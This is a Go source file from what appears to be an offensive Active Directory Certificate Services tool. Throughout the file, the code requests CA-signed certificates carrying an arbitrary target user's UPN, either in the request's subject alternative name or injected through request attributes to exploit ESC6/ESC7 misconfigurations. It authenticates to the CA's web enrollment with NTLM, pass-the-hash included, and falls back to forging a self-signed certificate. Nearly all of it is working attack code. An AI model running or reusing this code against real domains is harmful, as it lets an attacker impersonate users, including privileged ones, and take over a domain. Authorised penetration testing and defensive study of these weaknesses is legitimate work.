package pki

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

// GenerateCSR creates a PKCS#10 certificate signing request (DER-encoded) with
// the target UPN encoded as an OtherName SAN extension. The Subject CN is
// derived from the user portion of the UPN.
func GenerateCSR(key *ecdsa.PrivateKey, upn string, templateName string) ([]byte, error) {
	// Extract CN from UPN (user@domain -> user)
	cn := upn
	if at := strings.Index(upn, "@"); at > 0 {
		cn = upn[:at]
	}

	// Encode UPN as OtherName SAN using the same encoding as ForgeCertificate
	upnSAN, err := upnOtherName(upn)
	if err != nil {
		return nil, fmt.Errorf("encode UPN SAN: %w", err)
	}
	// SubjectAltName extension: SEQUENCE OF GeneralName, where GeneralName [0] = OtherName
	sanRaw := derTLV(0x30, upnSAN)

	csrTemplate := &x509.CertificateRequest{
		Subject: pkix.Name{
			CommonName: cn,
		},
		ExtraExtensions: []pkix.Extension{
			{
				Id:       []int{2, 5, 29, 17}, // subjectAltName
				Critical: false,
				Value:    sanRaw,
			},
		},
	}

	csrDER, err := x509.CreateCertificateRequest(rand.Reader, csrTemplate, key)
	if err != nil {
		return nil, fmt.Errorf("create CSR: %w", err)
	}

	return csrDER, nil
}

// EnrollCertificate generates a key pair, creates a CSR, and submits it to the
// CA's web enrollment endpoint (/certsrv/). This produces a CA-signed
// certificate that is valid for authentication against real AD environments.
//
// If sanInject is true (ESC6/ESC7), the UPN SAN is placed in the CertAttrib
// request attributes instead of the CSR itself, exploiting
// EDITF_ATTRIBUTESUBJECTALTNAME2.
//
// Falls back to ForgeCertificate() (self-signed, offline mode) if web
// enrollment is unreachable, with a clear warning.
func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInject bool) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	fmt.Printf("[*] Generating ECDSA P256 key pair for enrollment...\n")
	certKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, nil, fmt.Errorf("generate key pair: %w", err)
	}

	// Generate CSR — if sanInject, omit UPN from CSR (it goes in CertAttrib)
	csrUPN := targetUPN
	if sanInject {
		csrUPN = "" // SAN will be injected via request attributes
	}

	var csrDER []byte
	if csrUPN != "" {
		csrDER, err = GenerateCSR(certKey, csrUPN, templateName)
	} else {
		// Generate CSR without SAN extension for sanInject mode
		cn := targetUPN
		if at := strings.Index(targetUPN, "@"); at > 0 {
			cn = targetUPN[:at]
		}
		csrTemplate := &x509.CertificateRequest{
			Subject: pkix.Name{
				CommonName: cn,
			},
		}
		csrDER, err = x509.CreateCertificateRequest(rand.Reader, csrTemplate, certKey)
	}
	if err != nil {
		return nil, nil, fmt.Errorf("generate CSR: %w", err)
	}
	fmt.Printf("[+] CSR generated (CN=%s, SAN in CSR: %v)\n", targetUPN, !sanInject)

	// Discover CA hostname via enrollment services
	caHostname := ""
	services, err := EnumerateEnrollmentServices(cfg)
	if err != nil {
		fmt.Printf("[!] Warning: could not enumerate enrollment services: %v\n", err)
	} else if len(services) > 0 {
		caHostname = services[0].DNSHostName
		fmt.Printf("[+] Discovered CA web enrollment endpoint: %s\n", caHostname)
	}

	if caHostname == "" {
		fmt.Printf("[!] WARNING: No CA web enrollment endpoint discovered\n")
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	// Verify credentials for web enrollment (password OR hash required)
	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "") {
		fmt.Printf("[!] WARNING: No username/password/hash for web enrollment NTLM auth\n")
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	// Build SAN attribute for sanInject mode (ESC6)
	sanAttrib := ""
	if sanInject {
		sanAttrib = fmt.Sprintf("SAN:upn=%s", targetUPN)
		fmt.Printf("[*] SAN injection via request attributes: %s\n", sanAttrib)
	}

	// Submit CSR via HTTP web enrollment
	fmt.Printf("[*] Submitting CSR to %s/certsrv/...\n", caHostname)
	cert, err := submitCSRHTTP(cfg, caHostname, csrDER, templateName, sanAttrib)
	if err != nil {
		fmt.Printf("[!] WARNING: Web enrollment failed: %v\n", err)
		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
		return forgeFallback(certKey, targetUPN)
	}

	fmt.Printf("[+] CA-signed certificate obtained for %s\n", targetUPN)
	return cert, certKey, nil
}

// forgeFallback wraps ForgeCertificate for the offline fallback path. The
// returned certificate is self-signed and will not authenticate against a real
// domain controller.
func forgeFallback(key *ecdsa.PrivateKey, upn string) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	cert, certKey, err := ForgeCertificate(key, upn)
	if err != nil {
		return nil, nil, fmt.Errorf("offline forge fallback: %w", err)
	}
	fmt.Printf("[!] OFFLINE MODE: Certificate is self-signed — use only for testing/golden cert scenarios\n")
	return cert, certKey, nil
}

// newNTLMClient creates an *http.Client with NTLMv2 transport authentication.
// Supports both plaintext password and pass-the-hash via the cfg.Hash field.
// TLS verification is disabled (required for pen-test tools targeting internal
// AD infrastructure with self-signed certs).
func newNTLMClient(cfg *ADCSConfig) *http.Client {
	return &http.Client{
		Transport: &NTLMTransport{
			Domain:   cfg.Domain,
			Username: cfg.Username,
			Password: cfg.Password,
			Hash:     cfg.Hash,
		},
	}
}

// submitCSRHTTP posts a DER-encoded CSR to the CA's web enrollment endpoint
// (/certsrv/certfnsh.asp) using NTLM authentication. It tries HTTPS first,
// then falls back to HTTP. Supports pass-the-hash when cfg.Hash is set.
//
// The CertAttrib field carries the template name and optional SAN injection
// attribute (for ESC6 exploitation).
func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateName string, sanAttrib string) (*x509.Certificate, error) {
	// Base64-encode the CSR in PEM-style (certsrv expects the inner base64, not full PEM)
	csrB64 := base64.StdEncoding.EncodeToString(csrDER)

	// Build CertAttrib field
	certAttrib := fmt.Sprintf("CertificateTemplate:%s", templateName)
	if sanAttrib != "" {
		certAttrib += "\n" + sanAttrib
	}

	formData := url.Values{
		"Mode":             {"newreq"},
		"CertRequest":      {csrB64},
		"CertAttrib":       {certAttrib},
		"TargetStoreFlags": {"0"},
		"SaveCert":         {"yes"},
	}

	client := newNTLMClient(cfg)

	// Try HTTPS first, then HTTP
	schemes := []string{"https", "http"}
	var lastErr error

	for _, scheme := range schemes {
		submitURL := fmt.Sprintf("%s://%s/certsrv/certfnsh.asp", scheme, caHostname)
		fmt.Printf("[*] Trying %s enrollment: %s\n", strings.ToUpper(scheme), submitURL)

		formEncoded := formData.Encode()
		req, err := http.NewRequest("POST", submitURL, strings.NewReader(formEncoded))
		if err != nil {
			lastErr = fmt.Errorf("build request: %w", err)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.GetBody = func() (io.ReadCloser, error) {
			return io.NopCloser(strings.NewReader(formEncoded)), nil
		}

		resp, err := client.Do(req)
		if err != nil {
			lastErr = fmt.Errorf("%s request failed: %w", scheme, err)
			fmt.Printf("[!] %s failed: %v\n", strings.ToUpper(scheme), err)
			continue
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastErr = fmt.Errorf("read response body: %w", err)
			continue
		}

		if resp.StatusCode == http.StatusUnauthorized {
			lastErr = fmt.Errorf("authentication failed (HTTP 401) — check credentials/hash")
			fmt.Printf("[!] HTTP 401 Unauthorized — NTLM auth failed\n")
			continue
		}

		if resp.StatusCode != http.StatusOK {
			lastErr = fmt.Errorf("HTTP %d from certsrv", resp.StatusCode)
			continue
		}

		bodyStr := string(body)

		// Check for error messages in the response HTML
		if errMsg := extractCertsrvError(bodyStr); errMsg != "" {
			lastErr = fmt.Errorf("certsrv error: %s", errMsg)
			fmt.Printf("[!] CA returned error: %s\n", errMsg)
			continue
		}

		// Try to extract ReqID from the response
		reqID := extractReqID(bodyStr)
		if reqID == "" {
			lastErr = fmt.Errorf("could not parse ReqID from certsrv response")
			fmt.Printf("[!] Could not find certificate request ID in response\n")
			continue
		}

		fmt.Printf("[+] Certificate request submitted — ReqID=%s\n", reqID)

		// Download the issued certificate
		cert, err := downloadCert(client, caHostname, scheme, reqID)
		if err != nil {
			lastErr = fmt.Errorf("download cert ReqID=%s: %w", reqID, err)
			fmt.Printf("[!] Certificate download failed: %v\n", err)
			// Return reqID info even on download failure so operator can retrieve manually
			fmt.Printf("[*] Manual retrieval: certreq -retrieve -config \"%s\" %s cert.cer\n", caHostname, reqID)
			continue
		}

		return cert, nil
	}

	return nil, fmt.Errorf("web enrollment failed on all schemes: %w", lastErr)
}

// reReqID matches the certificate download link in certsrv HTML responses.
var reReqID = regexp.MustCompile(`certnew\.cer\?ReqID=(\d+)`)

// reReqIDJS matches the locDownloadCert1 JavaScript variable assignment.
var reReqIDJS = regexp.MustCompile(`locDownloadCert1\s*=\s*"[^"]*ReqID=(\d+)`)

// reErrorMsg matches common certsrv error patterns in response HTML.
var reErrorMsg = regexp.MustCompile(`<B>\s*Error[^<]*</B>[^<]*<P>\s*([^<]+)`)

// reDenied matches the "denied" disposition in certsrv responses.
var reDenied = regexp.MustCompile(`(?i)The disposition message is "([^"]*denied[^"]*)"`)

// extractReqID parses the request ID from a certsrv HTML response.
func extractReqID(body string) string {
	if m := reReqID.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reReqIDJS.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	return ""
}

// extractCertsrvError parses error messages from certsrv HTML responses.
func extractCertsrvError(body string) string {
	if m := reDenied.FindStringSubmatch(body); len(m) > 1 {
		return m[1]
	}
	if m := reErrorMsg.FindStringSubmatch(body); len(m) > 1 {
		return strings.TrimSpace(m[1])
	}
	return ""
}

// downloadCert fetches the issued certificate from the certsrv certnew.cer
// endpoint using the given request ID and parses it into an *x509.Certificate.
// Authentication is handled by the client's NTLMTransport.
func downloadCert(client *http.Client, caHostname, scheme, reqID string) (*x509.Certificate, error) {
	certURL := fmt.Sprintf("%s://%s/certsrv/certnew.cer?ReqID=%s&Enc=b64", scheme, caHostname, reqID)
	fmt.Printf("[*] Downloading certificate: %s\n", certURL)

	req, err := http.NewRequest("GET", certURL, nil)
	if err != nil {
		return nil, fmt.Errorf("build download request: %w", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("download request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read certificate response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP %d downloading certificate", resp.StatusCode)
	}

	// The response is a base64-encoded DER certificate, possibly PEM-wrapped
	certData := string(body)
	certData = strings.TrimSpace(certData)

	// Try PEM decode first
	block, _ := pem.Decode([]byte(certData))
	if block != nil {
		cert, err := x509.ParseCertificate(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("parse PEM certificate: %w", err)
		}
		return cert, nil
	}

	// Try raw base64 decode
	certDER, err := base64.StdEncoding.DecodeString(certData)
	if err != nil {
		// Try with line breaks stripped
		cleaned := strings.ReplaceAll(certData, "\r", "")
		cleaned = strings.ReplaceAll(cleaned, "\n", "")
		certDER, err = base64.StdEncoding.DecodeString(cleaned)
		if err != nil {
			return nil, fmt.Errorf("decode base64 certificate: %w", err)
		}
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("parse DER certificate: %w", err)
	}

	return cert, nil
}
